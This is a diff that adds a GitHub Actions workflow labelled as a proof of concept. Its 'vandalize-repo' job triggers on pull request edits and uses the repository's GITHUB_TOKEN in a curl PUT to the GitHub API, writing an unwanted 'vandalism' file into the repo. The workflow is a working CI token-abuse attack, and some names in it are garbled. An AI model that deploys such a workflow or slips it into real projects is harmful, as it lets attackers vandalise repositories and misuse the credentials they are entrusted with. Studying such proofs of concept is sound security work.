@@ -1,0 +1,15 @@
+name: "Proof-ofa-concept GitHub Actions workflow"
+
+on:
+  pull_request:
+    types: edited
+
+jobs:
+  vandalize-repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Vandalize
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/avandaliswawm.md" --data ''{"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}'' '
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
